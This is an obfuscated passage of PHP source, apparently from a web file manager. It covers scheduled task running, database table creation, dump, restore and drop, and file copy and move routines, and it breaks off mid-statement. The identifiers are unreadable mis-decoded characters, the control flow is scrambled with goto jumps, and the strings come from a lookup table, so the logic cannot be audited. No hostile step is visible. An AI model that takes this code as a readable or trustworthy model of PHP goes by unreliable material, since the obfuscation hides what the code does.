$D™Ù©≠ÍÀû[1422]: if (time() - $AÌ´≤éÌø· >= floatval($bÊÓ‡÷ã≠â[$D™Ù©≠ÍÀû[1422]]) * 60) { return !0; } break; default: break; } return !1; goto eé⁄ûˆ¬˜ª; E£ìßΩÁúê: $cØ¶±èŒ◊· = strtotime($D™Ù©≠ÍÀû[1412] . $bÊÓ‡÷ã≠â[$D™Ù©≠ÍÀû[1413]] . $D™Ù©≠ÍÀû[1414]) - strtotime($D™Ù©≠ÍÀû[1415]); $EÁﬂ—ä¨ã≈ = time() - strtotime(date($D™Ù©≠ÍÀû[1416]) . $D™Ù©≠ÍÀû[1417]); $A‡∫ﬁ æ∫à = $EÁﬂ—ä¨ã≈ >= $cØ¶±èŒ◊· && $EÁﬂ—ä¨ã≈ <= $cØ¶±èŒ◊· + 3600; goto C¨öªˆœŒˆ; eé⁄ûˆ¬˜ª: } public static function taskRun($b˘Æÿ‹®êè) { goto bí«êŒàÍ†; aæπΩÓ≥˜Ô: $eÉ°Ü„Éû™ = timeFloat(); $fˆ±†˜«Öò = $fã¯ä’ñÏ•[33]; switch ($b˘Æÿ‹®êè[$fã¯ä’ñÏ•[29]]) { case $fã¯ä’ñÏ•[295]: $b≥Â©Ö¬Ó˘ = url_request($b˘Æÿ‹®êè[$fã¯ä’ñÏ•[1426]], $fã¯ä’ñÏ•[216], !1, !1, !1, !1, 5); $fˆ±†˜«Öò = strlen($b≥Â©Ö¬Ó˘); break; case $fã¯ä’ñÏ•[215]: $fˆ±†˜«Öò = Hook::apply($b˘Æÿ‹®êè[$fã¯ä’ñÏ•[1426]]); default: break; } goto fªÖ€∏ÜØ; fªÖ€∏ÜØ: Model($fã¯ä’ñÏ•[1427])->add(array($fã¯ä’ñÏ•[1428] => $fã¯ä’ñÏ•[33], $fã¯ä’ñÏ•[1429] => $fã¯ä’ñÏ•[468], $fã¯ä’ñÏ•[29] => $fã¯ä’ñÏ•[1430] . $b˘Æÿ‹®êè[$fã¯ä’ñÏ•[367]], $fã¯ä’ñÏ•[1431] => json_encode(array($fã¯ä’ñÏ•[28] => $b˘Æÿ‹®êè[$fã¯ä’ñÏ•[28]], $fã¯ä’ñÏ•[1432] => timeFloat() - $eÉ°Ü„Éû™, $fã¯ä’ñÏ•[281] => $fˆ±†˜«Öò)))); self::log($fã¯ä’ñÏ•[1433] . $b˘Æÿ‹®êè[$fã¯ä’ñÏ•[367]] . $fã¯ä’ñÏ•[1434] . $fˆ±†˜«Öò); return !0; goto FÖÜıäóó⁄; bí«êŒàÍ†: $fã¯ä’ñÏ• =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::log($fã¯ä’ñÏ•[1423] . $b˘Æÿ‹®êè[$fã¯ä’ñÏ•[367]] . $fã¯ä’ñÏ•[1424] . $b˘Æÿ‹®êè[$fã¯ä’ñÏ•[28]] . $fã¯ä’ñÏ•[1425] . $b˘Æÿ‹®êè[$fã¯ä’ñÏ•[1426]]); Model($fã¯ä’ñÏ•[1409])->run($b˘Æÿ‹®êè[$fã¯ä’ñÏ•[367]]); goto aæπΩÓ≥˜Ô; FÖÜıäóó⁄: } private static function valueGet($eí∂ÂÇÂ≤Ø) { $F¯óıØ’ø¡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aÜÉ”ê…¿ä = $F¯óıØ’ø¡[1435]; $a¯ˆ£É…—Ò = Model($F¯óıØ’ø¡[1436])->get($eí∂ÂÇÂ≤Ø, $aÜÉ”ê…¿ä); if (is_null($a¯ˆ£É…—Ò)) { Model($F¯óıØ’ø¡[1436])->set($F¯óıØ’ø¡[1407], 10, $aÜÉ”ê…¿ä); Model($F¯óıØ’ø¡[1436])->set($F¯óıØ’ø¡[689], $F¯óıØ’ø¡[83], $aÜÉ”ê…¿ä); Model($F¯óıØ’ø¡[1436])->set($F¯óıØ’ø¡[1402], $F¯óıØ’ø¡[468], $aÜÉ”ê…¿ä); $a¯ˆ£É…—Ò = Model($F¯óıØ’ø¡[1436])->get($eí∂ÂÇÂ≤Ø, $aÜÉ”ê…¿ä); } return $a¯ˆ£É…—Ò; } private static function valueSet($b©Ì∏ÙΩ∞™, $eÚ«µ‚‰‚‘) { $Eí„ô áà§ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return Model($Eí„ô áà§[1436])->set($b©Ì∏ÙΩ∞™, $eÚ«µ‚‰‚‘, $Eí„ô áà§[1435]); } protected static function log($A‹Œ·ÍÒãï) { write_log($A‹Œ·ÍÒãï, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1437]); } private static function cacheClear() { $cı˜ŸåÁ±∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B”ëÙ≈£Ëƒ = Model($cı˜ŸåÁ±∆[1436])->cacheKey($cı˜ŸåÁ±∆[1435]); Cache::clearMemory($B”ëÙ≈£Ëƒ); } } goto fãäã†‚»ä; BÀ°¶›ã¯: class DbManage { function __construct($f‘õãê·≤Ì, $eÈ—òÿ∞ç = '') { $this->database = $f‘õãê·≤Ì; $this->type = $eÈ—òÿ∞ç; } public function model($F◊·ÂÌÀ€¯ = '') { return new ModelBase($F◊·ÂÌÀ€¯, $_SERVER[Ä¿¡‡öóµŸﬂ‡][33], $this->database); } public function db($B◊¨ÍÌˆñ¯ = false) { goto EÑ≥û´–ä‡; Dı‚ä∂€õ≈: if (!$aıè¥©›π) { $CÖëÜƒæà->execute("\143\x72\145\x61\164\x65\40\144\141\x74\x61\x62\141\x73\145\x20\140{$E©òé‡Àï√}\x60"); } $Bá·›∂¥Ñ[$AÇˆˆ√¢ÿÿ[889]] = $E©òé‡Àï√; if ($Bá·›∂¥Ñ[$AÇˆˆ√¢ÿÿ[731]] == $AÇˆˆ√¢ÿÿ[732]) { $Bá·›∂¥Ñ[$AÇˆˆ√¢ÿÿ[733]] .= $AÇˆˆ√¢ÿÿ[977] . $E©òé‡Àï√; } goto b‰¿ª›â∆Ø; cÛÏëËÓø∆: $this->database = $Bá·›∂¥Ñ; $CÖëÜƒæà = $this->model()->db(); try { $aıè¥©›π = $CÖëÜƒæà->execute("\163\150\x6f\167\40\144\141\164\x61\x62\141\x73\145\x73\x20\x6c\x69\x6b\145\40\x27{$E©òé‡Àï√}\47"); } catch (Exception $båÊ¬·¶§ó) { } goto Dı‚ä∂€õ≈; EÑ≥û´–ä‡: $AÇˆˆ√¢ÿÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bá·›∂¥Ñ = array_change_key_case($this->database); if ($this->type == $AÇˆˆ√¢ÿÿ[9] || !$B◊¨ÍÌˆñ¯) { return $this->model()->db(); } goto b∂ñè·ﬂó˜; b∂ñè·ﬂó˜: $E©òé‡Àï√ = $Bá·›∂¥Ñ[$AÇˆˆ√¢ÿÿ[889]]; $Bá·›∂¥Ñ[$AÇˆˆ√¢ÿÿ[889]] = $AÇˆˆ√¢ÿÿ[33]; if ($Bá·›∂¥Ñ[$AÇˆˆ√¢ÿÿ[731]] == $AÇˆˆ√¢ÿÿ[732]) { $bÏÓ≈”áí… = $Bá·›∂¥Ñ[$AÇˆˆ√¢ÿÿ[733]]; $Bá·›∂¥Ñ[$AÇˆˆ√¢ÿÿ[733]] = substr($bÏÓ≈”áí…, 0, strrpos($bÏÓ≈”áí…, $AÇˆˆ√¢ÿÿ[977])); } goto cÛÏëËÓø∆; b‰¿ª›â∆Ø: $this->database = $Bá·›∂¥Ñ; $CÖëÜƒæà->execute("\165\x73\145\40\x60{$E©òé‡Àï√}\x60"); return $CÖëÜƒæà; goto cŸ–Ωë¢–ú; cŸ–Ωë¢–ú: } public function createTable($F£∂ƒÌ°ßı, $aÎı∫∆∑êπ = null) { $CÜ¯ÑàÙú≤ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!IO::exist($F£∂ƒÌ°ßı)) { show_json(LNG($CÜ¯ÑàÙú≤[978]), !1); } $C±∂–éß€à = sqlSplit(IO::getContent($F£∂ƒÌ°ßı)); foreach ($C±∂–éß€à as $bÜÕõ“‹´Ë) { if ($aÎı∫∆∑êπ) { $eúÜŒÙìãÕ = stripos($bÜÕõ“‹´Ë, $CÜ¯ÑàÙú≤[979]) === 0; if ($eúÜŒÙìãÕ) { $aÎı∫∆∑êπ->task[$CÜ¯ÑàÙú≤[980]] += 1; } } $this->model()->db()->execute($bÜÕõ“‹´Ë); if ($aÎı∫∆∑êπ && $eúÜŒÙìãÕ) { preg_match($CÜ¯ÑàÙú≤[981], $bÜÕõ“‹´Ë, $B¬™óæÕˆì); $aÎı∫∆∑êπ->task[$CÜ¯ÑàÙú≤[982]] = $B¬™óæÕˆì[1]; $aÎı∫∆∑êπ->update(1); } } $this->taskToCache($aÎı∫∆∑êπ); } public function insertTable($dÃ∆€Ãäâﬁ, $C·¯¢æ£¯» = null) { $cÃ›Ê†çÃá =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b•∞òê—™¯ = $this->model()->db(); $DÇ®«‚§§≤ = $Bû‡Õ‘«øÆ ? array($Bû‡Õ‘«øÆ) : $b•∞òê—™¯->getTables(); foreach ($dÃ∆€Ãäâﬁ as $bÊ¬øÃ≥◊) { $Bû‡Õ‘«øÆ = basename($bÊ¬øÃ≥◊, $cÃ›Ê†çÃá[726]); if (!in_array($Bû‡Õ‘«øÆ, $DÇ®«‚§§≤)) { continue; } if ($C·¯¢æ£¯») { $C·¯¢æ£¯»->task[$cÃ›Ê†çÃá[982]] = $Bû‡Õ‘«øÆ; } if (get_filesize($bÊ¬øÃ≥◊) == 0) { continue; } $f´ô∞ò£™ı = $this->sqlToDb($bÊ¬øÃ≥◊, $C·¯¢æ£¯»); if (!$f´ô∞ò£™ı) { show_json(LNG($cÃ›Ê†çÃá[983]) . "\133{$Bû‡Õ‘«øÆ}\135", !1); } } $this->taskToCache($C·¯¢æ£¯»); } public function sqlFromDb($D∂Ûá‹Ç‹‘, $D¿ÒûÉΩÏ¨, $bÿ¿‹çñ˘ë = null, $d„⁄‰Ù◊Ø∆ = null) { goto aèÓû†äÕè; D®„¬√Ó“≥: $D≠àÃì’ŒÒ = 1; $Aƒè˘›Ì∂É = 500; $a‘—á·•Üû = fopen($D¿ÒûÉΩÏ¨, $_SERVER[Ä¿¡‡öóµŸﬂ‡][984]); goto b‰ï’•Ÿóè; b‰ï’•Ÿóè: $e°Ã’·ú≤ë = $bé∫Ëæœ‘†->getPk(); $dùÕ∆‰≤¬å = $bé∫Ëæœ‘†->getDbFields(); do { $b‹¨–Ì»ÚÎ = $bé∫Ëæœ‘†->field($dùÕ∆‰≤¬å)->order($e°Ã’·ú≤ë . $_SERVER[Ä¿¡‡öóµŸﬂ‡][985])->selectPage($Aƒè˘›Ì∂É, $D≠àÃì’ŒÒ); $DΩÈ·¬ï∫Ø = isset($b‹¨–Ì»ÚÎ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][351]][$_SERVER[Ä¿¡‡öóµŸﬂ‡][353]]) ? $b‹¨–Ì»ÚÎ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][351]][$_SERVER[Ä¿¡‡öóµŸﬂ‡][353]] : 0; $Cî∏¨∞®©≠ = !empty($b‹¨–Ì»ÚÎ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][354]]) ? $b‹¨–Ì»ÚÎ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][354]] : array(); if (!($fâà…≥ÚÆ° = count($Cî∏¨∞®©≠))) { break; } $cÊÒèµè¿ó = array(); foreach ($Cî∏¨∞®©≠ as $c·À∫ö§â´) { if ($D∂Ûá‹Ç‹‘ == $_SERVER[Ä¿¡‡öóµŸﬂ‡][986] && $c·À∫ö§â´[$_SERVER[Ä¿¡‡öóµŸﬂ‡][29]] == $_SERVER[Ä¿¡‡öóµŸﬂ‡][987]) { $A⁄±ÉööúÆ = json_decode($c·À∫ö§â´[$_SERVER[Ä¿¡‡öóµŸﬂ‡][359]], !0); if ($A⁄±ÉööúÆ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][28]] == date($_SERVER[Ä¿¡‡öóµŸﬂ‡][690]) && !$A⁄±ÉööúÆ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][689]]) { continue; } } if ($d„⁄‰Ù◊Ø∆) { $c·À∫ö§â´[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]] = "\x7b\151\157\72{$d„⁄‰Ù◊Ø∆}\x7d" . substr($c·À∫ö§â´[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]], strlen("\x7b\x69\157\72{$c·À∫ö§â´[$_SERVER[Ä¿¡‡öóµŸﬂ‡][752]]}\x7d")); $c·À∫ö§â´[$_SERVER[Ä¿¡‡öóµŸﬂ‡][752]] = $d„⁄‰Ù◊Ø∆; } $cÊÒèµè¿ó[] = $_SERVER[Ä¿¡‡öóµŸﬂ‡][988] . $this->sqlEncode($c·À∫ö§â´) . $_SERVER[Ä¿¡‡öóµŸﬂ‡][989]; } $b∏äˆîçÕÚ = "\111\116\x53\x45\x52\124\40\111\116\x54\117\40\140{$D∂Ûá‹Ç‹‘}\x60\x20\50\140" . implode($_SERVER[Ä¿¡‡öóµŸﬂ‡][990], $dùÕ∆‰≤¬å) . $_SERVER[Ä¿¡‡öóµŸﬂ‡][991]; fwrite($a‘—á·•Üû, $b∏äˆîçÕÚ . implode($_SERVER[Ä¿¡‡öóµŸﬂ‡][992], $cÊÒèµè¿ó) . $_SERVER[Ä¿¡‡öóµŸﬂ‡][67] . PHP_EOL); $D≠àÃì’ŒÒ++; $eéÇÉÉ©ûü += $fâà…≥ÚÆ°; if ($bÿ¿‹çñ˘ë) { $bÿ¿‹çñ˘ë->update($fâà…≥ÚÆ°); } } while ($D≠àÃì’ŒÒ <= $DΩÈ·¬ï∫Ø); goto C‚ÉåÀº’Î; C‚ÉåÀº’Î: fclose($a‘—á·•Üû); return $eéÇÉÉ©ûü; goto a¥™∞‰†üµ; aèÓû†äÕè: if ($bÿ¿‹çñ˘ë) { $bÿ¿‹çñ˘ë->task[$_SERVER[Ä¿¡‡öóµŸﬂ‡][982]] = $D∂Ûá‹Ç‹‘; } $bé∫Ëæœ‘† = $this->model($D∂Ûá‹Ç‹‘); $eéÇÉÉ©ûü = 0; goto D®„¬√Ó“≥; a¥™∞‰†üµ: } public function sqlToDb($cÈé‡ã·ﬁ, $AÛè€ä¡ÉΩ = null) { goto C°ÓÛœ≤éû; d∫ûÈ¨•™Ú: $E‘Ã ÔìÕî = 500 + 1; while (!feof($dã‹ÈãŒéË)) { if ($AÛè€ä¡ÉΩ && $cï÷ªÂ÷©∑ != 0) { $AÛè€ä¡ÉΩ->task[$BÌ∆≠ñ…èæ[980]] += 1; } $cï÷ªÂ÷©∑++; $c‡ﬁø∞¥ª⁄ = trim(fgets($dã‹ÈãŒéË)); $A∆¡ﬂ™ø§ .= $BÌ∆≠ñ…èæ[50] . $this->sqlDecode($c‡ﬁø∞¥ª⁄, $this->type); if ($cï÷ªÂ÷©∑ == $E‘Ã ÔìÕî) { $A∆¡ﬂ™ø§ = rtrim(trim($A∆¡ﬂ™ø§), $BÌ∆≠ñ…èæ[67]); if (!$d’Ûﬁ”≥àƒ->execute($A∆¡ﬂ™ø§)) { return !1; } if ($AÛè€ä¡ÉΩ) { $AÛè€ä¡ÉΩ->update($cï÷ªÂ÷©∑ - 1); } $A∆¡ﬂ™ø§ = $BÌ∆≠ñ…èæ[33]; $cï÷ªÂ÷©∑ = 0; } } fclose($dã‹ÈãŒéË); goto C§ı‘°Ï¿è; C§ı‘°Ï¿è: if (trim($A∆¡ﬂ™ø§)) { $A∆¡ﬂ™ø§ = rtrim(trim($A∆¡ﬂ™ø§), $BÌ∆≠ñ…èæ[67]); if (!$d’Ûﬁ”≥àƒ->execute($A∆¡ﬂ™ø§)) { return !1; } if ($AÛè€ä¡ÉΩ) { $AÛè€ä¡ÉΩ->update($cï÷ªÂ÷©∑ - 1); } } return !0; goto FÁí™Õ∑«ô; C°ÓÛœ≤éû: $BÌ∆≠ñ…èæ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d’Ûﬁ”≥àƒ = $this->model()->db(); $dã‹ÈãŒéË = @fopen($cÈé‡ã·ﬁ, $BÌ∆≠ñ…èæ[993]); goto e≈ü∏öÿƒâ; e≈ü∏öÿƒâ: if (!$dã‹ÈãŒéË) { return !1; } $cï÷ªÂ÷©∑ = 0; $A∆¡ﬂ™ø§ = $BÌ∆≠ñ…èæ[33]; goto d∫ûÈ¨•™Ú; FÁí™Õ∑«ô: } public function dropTable($Dô‚Ë´Í°ü = null) { $Föß¡”»îé = $this->model()->db(); $Fﬂ¡Ùˆïıƒ = $Dô‚Ë´Í°ü ? array($Dô‚Ë´Í°ü) : $Föß¡”»îé->getTables(); if (!$Fﬂ¡Ùˆïıƒ) { return; } foreach ($Fﬂ¡Ùˆïıƒ as $Dô‚Ë´Í°ü) { $Föß¡”»îé->execute("\x64\x72\x6f\x70\x20\x74\x61\x62\154\145\x20\x69\x66\40\145\170\x69\163\164\163\x20\140{$Dô‚Ë´Í°ü}\x60"); } } private function taskToCache($bæª–—´é˜ = null) { $b©∞åÆÖ…‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$bæª–—´é˜) { return; } $a›Ñ£ôâ•± = array($b©∞åÆÖ…‹[982] => $bæª–—´é˜->task[$b©∞åÆÖ…‹[982]], $b©∞åÆÖ…‹[980] => $bæª–—´é˜->task[$b©∞åÆÖ…‹[980]], $b©∞åÆÖ…‹[994] => $bæª–—´é˜->task[$b©∞åÆÖ…‹[994]]); if ($a›Ñ£ôâ•±[$b©∞åÆÖ…‹[980]] == $a›Ñ£ôâ•±[$b©∞åÆÖ…‹[994]]) { $a›Ñ£ôâ•±[$b©∞åÆÖ…‹[696]] = 1; } Cache::set($b©∞åÆÖ…‹[995] . $bæª–—´é˜->task[$b©∞åÆÖ…‹[367]], $a›Ñ£ôâ•±); $bæª–—´é˜->end(); } private function sqlEncode($eÉ¡˘©µÁ¬) { $d∏˜œï–Ÿã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aäªäË™˘Â = array(); foreach ($eÉ¡˘©µÁ¬ as $AÓ é öàÒ) { if (is_array($AÓ é öàÒ)) { $AÓ é öàÒ = json_encode_force($AÓ é öàÒ); } $AÓ é öàÒ = addslashes($AÓ é öàÒ); $AÓ é öàÒ = str_replace(array($d∏˜œï–Ÿã[996], $d∏˜œï–Ÿã[217]), array($d∏˜œï–Ÿã[997], $d∏˜œï–Ÿã[998]), $AÓ é öàÒ); $aäªäË™˘Â[] = str_replace($d∏˜œï–Ÿã[55], $d∏˜œï–Ÿã[999], $AÓ é öàÒ); } return $d∏˜œï–Ÿã[55] . implode($d∏˜œï–Ÿã[1000], $aäªäË™˘Â) . $d∏˜œï–Ÿã[55]; } private function sqlDecode($F…€Éòç§å, $Eﬁª†ÃØ∞) { $Dã§≥ë””Œ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F…€Éòç§å = str_replace(array($Dã§≥ë””Œ[997], $Dã§≥ë””Œ[998]), array($Dã§≥ë””Œ[996], $Dã§≥ë””Œ[217]), $F…€Éòç§å); if ($Eﬁª†ÃØ∞ == $Dã§≥ë””Œ[9]) { $F…€Éòç§å = stripslashes($F…€Éòç§å); } return $F…€Éòç§å; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($D‘ø‹ÉÕÉ⁄, $D∆«ÕÓÇ•) { $DÃèü¥Öúù = self::driverMake($D∆«ÕÓÇ•[0]); if (method_exists($DÃèü¥Öúù, $D‘ø‹ÉÕÉ⁄)) { return @call_user_func_array(array($DÃèü¥Öúù, $D‘ø‹ÉÕÉ⁄), $D∆«ÕÓÇ•); } if (method_exists($DÃèü¥Öúù, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1001])) { return @call_user_func_array(array($DÃèü¥Öúù, $D‘ø‹ÉÕÉ⁄), $D∆«ÕÓÇ•); } else { if (method_exists(self, $D‘ø‹ÉÕÉ⁄)) { return @call_user_func_array(array(self, $D‘ø‹ÉÕÉ⁄), $D∆«ÕÓÇ•); } else { call_user_func_array(array(parent, $D‘ø‹ÉÕÉ⁄), $D∆«ÕÓÇ•); } } } public static function init($D‰Ê≤∫É¿Ê) { return self::driverMake($D‰Ê≤∫É¿Ê); } public static function copy($aÎË±πäÜ„, $C˘áì–∫õÂ, $C«Ö‘ñâèÏ = false, $b¢Ã≤âà•‡ = false) { return self::copyMove($aÎË±πäÜ„, $C˘áì–∫õÂ, $C«Ö‘ñâèÏ, $_SERVER[Ä¿¡‡öóµŸﬂ‡][490], $b¢Ã≤âà•‡); } public static function move($bœŸØ∆∏ÃØ, $Bêÿå»Ñ‰±, $E†ô™∫îÉñ = false, $E¡äªŸÖâ∆ = false) { return self::copyMove($bœŸØ∆∏ÃØ, $Bêÿå»Ñ‰±, $E†ô™∫îÉñ, $_SERVER[Ä¿¡‡öóµŸﬂ‡][492], $E¡äªŸÖâ∆); } public static function saveFile($AÈ•ãﬂä◊◊, $D˘êºéõåƒ, $bª£ºõƒÍ´ = true) { goto Fãâ¿éëπ•; fÑÑÿÍÖŸ´: $aâ˘òÍ◊åﬁ = self::copyFile($d—ç˜îœê≈, $AÈ•ãﬂä◊◊, $f˘¬òõ„’á, $AÇºâí¡ÔÇ, $DüªÆãˆ””[$füò◊©Ôãÿ[28]], $A€ˆÁ«ø•ò); if ($CÔ õ‚ß∏Ò) { $aâ˘òÍ◊åﬁ = $CÔ õ‚ß∏Ò->getPathOuter($aâ˘òÍ◊åﬁ); } return $aâ˘òÍ◊åﬁ; goto E√œœµ¬¬Ñ; b‰»—Ó“Îè: $AÇºâí¡ÔÇ = $f˘¬òõ„’á->pathFather($D˘êºéõåƒ); $A€ˆÁ«ø•ò = !0; if (!$bª£ºõƒÍ´ && self::driverIsSame($d—ç˜îœê≈, $f˘¬òõ„’á)) { $A€ˆÁ«ø•ò = !1; } goto fÑÑÿÍÖŸ´; EŒ†¿à⁄ŸÃ: $f˘¬òõ„’á = self::driverMake($D˘êºéõåƒ); $CÔ õ‚ß∏Ò = !1; if ($f˘¬òõ„’á->pathParse[$füò◊©Ôãÿ[1002]]) { $D√è∏ë—‰í = $f˘¬òõ„’á->pathParse[$füò◊©Ôãÿ[1002]]; $CÔ õ‚ß∏Ò = $f˘¬òõ„’á; $f˘¬òõ„’á = self::driverMake($D√è∏ë—‰í); } goto b‰»—Ó“Îè; Fãâ¿éëπ•: $füò◊©Ôãÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DüªÆãˆ”” = self::info($D˘êºéõåƒ); $d—ç˜îœê≈ = self::driverMake($AÈ•ãﬂä◊◊); goto EŒ†¿à⁄ŸÃ; E√œœµ¬¬Ñ: } private static function copyMove($b°Õ¡å“Ê◊, $f¨ï⁄“Ø¥¥, $AÃ∏ë‚ò∏ä, $EÏîçØàÛ±, $eàÑÕ∞±Ú = false) { goto aÂŒÎ ¢ÍÔ; aÂŒÎ ¢ÍÔ: $EÚÓ∏Ö‡§Û =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$b°Õ¡å“Ê◊ || $b°Õ¡å“Ê◊ == $EÚÓ∏Ö‡§Û[8] || !$f¨ï⁄“Ø¥¥) { return !1; } ignore_timeout(); goto b£˜Ê≠†ﬁ“; EÈ–•÷µâË: $cÇÎÔÌ≈Çé = $D¶‹¿Çêá->isFile($b°Õ¡å“Ê◊); if (!$cÇÎÔÌ≈Çé && $cåÈ¶˘≥Ü∏->getType() == $EÚÓ∏Ö‡§Û[694] && $D¶‹¿Çêá->getType() == $EÚÓ∏Ö‡§Û[102]) { $Fä©ˆ≈ÈºΩ = $cåÈ¶˘≥Ü∏->copyFolderFromIO($D¶‹¿Çêá, $b°Õ¡å“Ê◊, $f¨ï⁄“Ø¥¥, $AÃ∏ë‚ò∏ä, $DÒ°©…åÑ’, $eàÑÕ∞±Ú); } else { $Fä©ˆ≈ÈºΩ = self::copyPath($D¶‹¿Çêá, $b°Õ¡å“Ê◊, $cåÈ¶˘≥Ü∏, $f¨ï⁄“Ø¥¥, $AÃ∏ë‚ò∏ä, $DÒ°©…åÑ’, $cÇÎÔÌ≈Çé, $eàÑÕ∞±Ú); } if ($Fä©ˆ≈ÈºΩ && $DÒ°©…åÑ’) { $D¶‹¿Çêá->remove($b°Õ¡å“Ê◊); } goto a∑Ô¶Û§®¿; e≈áÂ¨»›µ: Hook::trigger($EÚÓ∏Ö‡§Û[72], $D¶‹¿Çêá, $b°Õ¡å“Ê◊, $cåÈ¶˘≥Ü∏, $f¨ï⁄“Ø¥¥); $FÚ¨“öÑºÕ = self::driverIsSame($D¶‹¿Çêá, $cåÈ¶˘≥Ü∏); if ($FÚ¨“öÑºÕ) { if ($EÏîçØàÛ± == $EÚÓ∏Ö‡§Û[492] && !method_exists($cåÈ¶˘≥Ü∏, $EÚÓ∏Ö‡§Û[1003]) && trim($f¨ï⁄“Ø¥¥, $EÚÓ∏Ö‡§Û[8]) == trim($cåÈ¶˘≥Ü∏->pathFather($b°Õ¡å“Ê◊), $EÚÓ∏Ö‡§Û[8])) { return $cåÈ¶˘≥Ü∏->getPathOuter($b°Õ¡å“Ê◊); } if (method_exists($cåÈ¶˘≥Ü∏, $EÏîçØàÛ±)) { return $cåÈ¶˘≥Ü∏->{$EÏîçØàÛ±}($b°Õ¡å“Ê◊, $f¨ï⁄“Ø¥¥, $AÃ∏ë‚ò∏ä); } } goto EÈ–•÷µâË; b£˜Ê≠†ﬁ“: $D¶‹¿Çêá = self::driverMake($b°Õ¡å“Ê◊); $cåÈ¶˘≥Ü∏ = self::driverMake($f¨ï⁄“Ø¥¥); $DÒ°©…åÑ’ = $EÏîçØàÛ± == $EÚÓ∏Ö‡§Û[492]; goto A…äÀÓÖ¿; a∑Ô¶Û§®¿: if ($D±ƒ†œ„∆™) { $Fä©ˆ≈ÈºΩ = $D±ƒ†œ„∆™->getPathOuter($Fä©ˆ≈ÈºΩ); } return $Fä©ˆ≈ÈºΩ; goto fä⁄ä™ΩÌÂ; A…äÀÓÖ¿: $D±ƒ†œ„∆™ = !1; if ($cåÈ¶˘≥Ü∏->pathParse[$EÚÓ∏Ö‡§Û[1002]]) { $f¨ï⁄“Ø¥¥ = $cåÈ¶˘≥Ü∏->pathParse[$EÚÓ∏Ö‡§Û[1002]]; $D±ƒ†œ„∆™ = $cåÈ¶˘≥Ü∏; $cåÈ¶˘≥Ü∏ = self::driverMake($f¨ï⁄“Ø¥¥); } self::check($D¶‹¿Çêá, $b°Õ¡å“Ê◊, $cåÈ¶˘≥Ü∏, $f¨ï⁄“Ø¥¥); goto e≈áÂ¨»›µ; fä⁄ä™ΩÌÂ: } private static function check($B—°€‚öÕó, $AÁá£‚„ù—, $Dﬂº®‹‚‡Û, &$F€∞≈À»æ) { $cÕπà∆≥õà =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (self::driverIsSame($B—°€‚öÕó, $Dﬂº®‹‚‡Û) && $B—°€‚öÕó->isFolder($AÁá£‚„ù—) && $B—°€‚öÕó->isParentOf($AÁá£‚„ù—, $F€∞≈À»æ)) { show_json(LNG($cÕπà∆≥õà[1004]), !1); } if (!$B—°€‚öÕó->exist($AÁá£‚„ù—)) { show_json(LNG($cÕπà∆≥õà[101]), !1); } } private static function copyPath($F§ìÎ´Çá”, $aœüäÊèœƒ, $CÉÍ–ƒË∞¿, $E°‡—≤‚éî, $bı¡Ë÷ëÌù, $dêΩ∑≥£‰û, $a¶±Ê´≤ø´, $F±¢‘—√≈≈ = false) { goto e¨©Çƒ÷ƒî; f®äí⁄¿ñå: $fı«ÇÛ≠®± = array_merge($EΩ—Á§“î¯[$b˘˘Ç£≠™ó[73]], $EΩ—Á§“î¯[$b˘˘Ç£≠™ó[74]]); foreach ($fı«ÇÛ≠®± as $cˆÚ«≤◊≠î) { $dé≥«—â∆€ = $cˆÚ«≤◊≠î[$b˘˘Ç£≠™ó[29]] == $b˘˘Ç£≠™ó[167]; $aœüäÊèœƒ = $F§ìÎ´Çá”->getPathInner($cˆÚ«≤◊≠î[$b˘˘Ç£≠™ó[75]]); $cÉÜ“æÇß€ = self::copyPath($F§ìÎ´Çá”, $aœüäÊèœƒ, $CÉÍ–ƒË∞¿, $E°‡—≤‚éî, $bı¡Ë÷ëÌù, $dêΩ∑≥£‰û, $dé≥«—â∆€); if (!$cÉÜ“æÇß€) { write_log($b˘˘Ç£≠™ó[1005] . $aœüäÊèœƒ . $b˘˘Ç£≠™ó[1006] . $E°‡—≤‚éî, $b˘˘Ç£≠™ó[1007]); } } return $E∞∫π⁄ïïŒ; goto D√•äﬂ›ä¡; a¨åà¬óÖß: if ($a¶±Ê´≤ø´) { return self::copyFile($F§ìÎ´Çá”, $aœüäÊèœƒ, $CÉÍ–ƒË∞¿, $E°‡—≤‚éî, $Dﬂ¨Ø‘Èâï, $dêΩ∑≥£‰û); } if ($bı¡Ë÷ëÌù == REPEAT_RENAME_FOLDER) { $bı¡Ë÷ëÌù = !1; } $DÕ‹¯‚Ç‹˘ = rtrim($E°‡—≤‚éî, $b˘˘Ç£≠™ó[8]) . $b˘˘Ç£≠™ó[8] . $Dﬂ¨Ø‘Èâï; goto B∞äŸä«Ú‰; e¨©Çƒ÷ƒî: $b˘˘Ç£≠™ó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dﬂ¨Ø‘Èâï = $F±¢‘—√≈≈ ? $F±¢‘—√≈≈ : $F§ìÎ´Çá”->getPathName($F§ìÎ´Çá”->pathThis($aœüäÊèœƒ)); if ($bı¡Ë÷ëÌù) { $a ΩÜÓ∆î = 